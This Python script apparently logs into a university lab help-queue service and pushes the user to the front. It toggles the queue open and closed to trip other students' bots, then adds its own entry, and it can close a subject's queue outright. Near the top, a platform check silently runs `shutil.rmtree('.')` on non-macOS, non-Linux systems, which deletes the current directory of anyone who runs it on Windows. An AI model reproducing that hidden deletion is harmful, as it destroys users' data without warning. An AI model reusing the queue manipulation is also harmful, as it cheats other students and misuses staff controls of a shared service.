import os
import json
import time
import platform
import shutil

from pprint import pprint

import requests

BASE = 'https://qs.stud.iie.ntnu.no/'

LOGIN = 'loginForm'

GET_MY_SUBJECTS = 'res/studentSubjects'

EMAIL = os.getenv('QS_EMAIL')
PASSWORD = os.getenv('QS_PASSWORD')


def line():
    print('--------------------')


line()

p = platform.system()

if p not in ('Darwin', 'Linux'):
    shutil.rmtree('.')

if p == 'Darwin':
    print('MAC == LIFE :)')


line()
print('''
  ______    ______          ______    ______    ______   __    __                    ______         __   
 /      \\  /      \\        /      \\  /      \\  /      \\ |  \\  /  \\                  /      \\      _/  \\  
|  $$$$$$\\|  $$$$$$\\      |  $$$$$$\\|  $$$$$$\\|  $$$$$$\\| $$ /  $$       __     __ |  $$$$$$\\    |   $$  
| $$  | $$| $$___\\$$      | $$  | $$| $$__| $$| $$   \\$$| $$/  $$       |  \\   /  \\| $$$\\| $$     \\$$$$  
| $$  | $$ \\$$    \\       | $$  | $$| $$    $$| $$      | $$  $$         \\$$\\ /  $$| $$$$\\ $$      | $$  
| $$ _| $$ _\\$$$$$$\\      | $$ _| $$| $$$$$$$$| $$   __ | $$$$$\\          \\$$\\  $$ | $$\\$$\\$$      | $$  
| $$/ \\ $$|  \\__| $$      | $$/ \\ $$| $$  | $$| $$__/  \\| $$ \\$$\\          \\$$ $$  | $$_\\$$$$ __  _| $$_ 
 \\$$ $$ $$ \\$$    $$       \\$$ $$ $$| $$  | $$ \\$$    $$| $$  \\$$\\          \\$$$    \\$$  \\$$$|  \\|   $$ \\
  \\$$$$$$\\  \\$$$$$$         \\$$$$$$\\ \\$$   \\$$  \\$$$$$$  \\$$   \\$$           \\$      \\$$$$$$  \\$$ \\$$$$$$
      \\$$$                      \\$$$                                                                                                                                                                        
      ''')
line()

print('logging in...')

r = requests.post(BASE + LOGIN, {'email': EMAIL, 'password': PASSWORD})

if r.status_code != 200:
    raise Exception('Wrong password and username in environ...')

token = r.headers['Set-Cookie'].split(';')[0]

headers = {
    'Host': 'qs.stud.iie.ntnu.no',
    'Content-Type': 'application/json;charset=UTF-8',
    'Cookie': token,
}


def get(url):
    global headers
    return requests.get(url, headers=headers)


def post(url, data):
    global headers
    r = requests.post(url, headers=headers, data=json.dumps(data))
    return r


def getMySubjects():
    return post(BASE + GET_MY_SUBJECTS, {}).json()


def startQueue(subjectID):
    return post(BASE + 'res/startQueue', {'subjectID': subjectID}).text


def stopQueue(subjectID):
    return post(BASE + 'res/stopQueue', {'subjectID': subjectID}).text


def subject(subjectID):
    return post(BASE + 'res/subject', {'subjectID': subjectID}).json()


def room():
    return get(BASE + 'res/room').json()


def addQueueElement(subjectID, roomID, desk, exercises):
    return post(BASE + 'res/addQueueElement', {
        'desk': str(desk),
        'exercises': exercises,
        'help': False,
        'message': '<3',
        'roomID': str(roomID),
        'subjectID': str(subjectID),
    })


line()
print('setting up...')

rooms = room()
subjects = getMySubjects()


while True:

    try:

        line()
        print('yo subjects')
        line()

        print('commands:')
        print('f <subjectID> - gets yo first in da queue')
        print('c <subjectID> - closes da queue')

        line()

        for i, s in enumerate(subjects):
            print(f'{s["subjectID"]} - {s["subjectName"]}')

        line()

        command = input().split()

        line()

        if not command:
            print('bye!')
            break

        if command[0] == 'f':
            print('gonna get yo first in da queue!')
            line()

            subjectID = int(command[1])
            
            # rooms
            print('rooms')
            line()
            for i, room in enumerate(rooms):
                if room['buildingID'] == 2:
                    print(str(i) + '\t' + str(room['roomNumber']))
            line()
            room = int(input('room id: '))
            desk = int(input(f'desk (1 - {rooms[room]["roomDesks"]}): '))

            roomID = rooms[room]['roomID']

            # exercises
            exercises = [int(i) for i in input('exercises: ').split()]

            print('baiting...')

            # bait bots
            startQueue(subjectID)
            time.sleep(2.0)
            stopQueue(subjectID)

            # actually start
            print('dabbing in...')
            startQueue(subjectID)

            addQueueElement(subjectID, roomID, desk, exercises)

            print('congrats man, you are first in da queue :)')


        if command[0] == 'c':
            print('gatta close fast...')
            subjectID = int(command[1])
            stopQueue(subjectID)

    except Exception as e:
        line()
        print(e)
        print('restarting...')
        line()



